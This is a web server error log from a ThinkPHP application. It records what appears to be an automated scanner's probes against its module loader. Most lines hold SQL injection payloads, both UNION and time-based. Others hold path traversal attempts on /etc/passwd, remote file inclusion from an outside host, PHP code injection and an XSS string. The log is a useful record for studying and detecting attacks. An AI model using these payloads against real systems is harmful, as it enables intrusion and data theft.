[ 2015-09-23T04:53:38+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:42+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:53:42+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:43+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:44+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:44+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:53:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:53:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:46+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:48+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:53:52+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:53:53+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:53+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:54+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:54+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:55+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:56+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:53:56+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:53:57+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:53:57+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:53:58+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:59+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:53:59+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:00+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:00+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:01+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:03+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:54:03+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:54:04+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:54:05+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:05+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:06+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:06+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:07+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:07+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:08+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:09+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:09+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:54:11+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:54:12+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:54:12+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:13+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:13+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:14+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:15+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:15+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:16+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:16+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:21+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:21+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:22+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:22+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:54:23+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:54:24+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:54:24+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:25+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:25+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:26+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:27+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:27+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:28+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:28+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:29+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:30+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:30+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:31+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:31+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:32+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:36+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:54:40+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:41+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:45+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:46+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:47+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:48+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:48+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:54:49+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:54:53+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL#
[ 2015-09-23T04:55:01+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
[ 2015-09-23T04:55:01+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
[ 2015-09-23T04:55:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T04:55:02+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T04:55:03+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:04+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:04+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:08+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:09+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:10+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:11+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:15+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T04:55:19+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType AND SLEEP(5) #
[ 2015-09-23T04:55:26+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType'; SELECT SLEEP(5)-- 
[ 2015-09-23T04:55:27+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType) AND SLEEP(5) #
[ 2015-09-23T04:55:31+08:00 ] ERR: (ThinkException) 无法加载模块GoodsType WAITFOR DELAY '0:0:5'--
[ 2015-09-23T05:10:02+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-23T05:10:11+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-23T05:10:16+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-23T05:10:21+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-23T05:10:27+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-23T05:10:32+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-23T05:11:08+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T05:11:57+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T05:12:26+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-23T05:17:54+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-23T05:18:01+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
[ 2015-09-23T05:18:08+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
[ 2015-09-23T05:18:40+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
[ 2015-09-23T11:08:17+08:00 ] ERR: (ThinkException) 无法加载模块/etc/passwd
[ 2015-09-23T11:08:32+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd
[ 2015-09-23T11:08:55+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../etc/passwd .jpg
[ 2015-09-23T11:09:22+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../../../etc/passwd%00
[ 2015-09-23T11:09:34+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini
[ 2015-09-23T11:09:50+08:00 ] ERR: (ThinkException) 无法加载模块../../../../../../../../windows/win.ini .jpg
[ 2015-09-23T11:10:08+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T11:10:21+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
[ 2015-09-23T11:10:26+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
[ 2015-09-23T11:11:11+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
[ 2015-09-23T17:14:30+08:00 ] ERR: (ThinkException) 无法加载模块Deal,[.'[[[)()
[ 2015-09-23T17:14:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:34+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:35+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:14:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:36+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:37+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
[ 2015-09-23T17:14:38+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
[ 2015-09-23T17:14:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:39+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
[ 2015-09-23T17:14:40+08:00 ] ERR: (ThinkException) 无法加载模块Deal') UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
